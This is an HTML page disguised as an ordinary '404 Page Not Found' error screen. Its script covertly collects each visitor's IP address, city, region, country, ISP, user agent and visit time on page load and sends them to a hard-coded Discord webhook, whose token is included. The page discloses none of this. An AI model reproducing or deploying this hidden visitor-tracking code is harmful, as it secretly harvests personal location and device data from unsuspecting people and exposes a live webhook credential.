<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 - Page Not Found</title>
    <style>
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 5px;
            text-align: center;
        }
        .error {
            color: #ff4444;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="error">404</h1>
        <p>Page not found</p>
    </div>
    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/1560508066695479398/I5XhnpVyVwA86_we_niKPgfadydZO8tTTJGBoSoeshKIMmOHt19sFNhgyE-WHAAZXtau';
        
        async function getIP() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                document.getElementById('ip').textContent = data.ip;
                
                const info = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    userAgent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };
                
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `IP: ${info.ip}`,
                        embeds: [{
                            title: 'Visitor Info',
                            fields: [
                                {name: 'IP', value: info.ip, inline: true},
                                {name: 'Location', value: `${info.city}, ${info.region}, ${info.country}`, inline: true},
                                {name: 'ISP', value: info.isp, inline: true},
                                {name: 'User Agent', value: info.userAgent.substring(0, 1000), inline: false},
                                {name: 'Time', value: info.timestamp, inline: false}
                            ],
                            color: 0x00ff00
                        }]
                    })
                });
            } catch (err) {
                document.getElementById('ip').textContent = 'Error loading IP';
            }
        }
        
        getIP();
    </script>
</body>
</html>
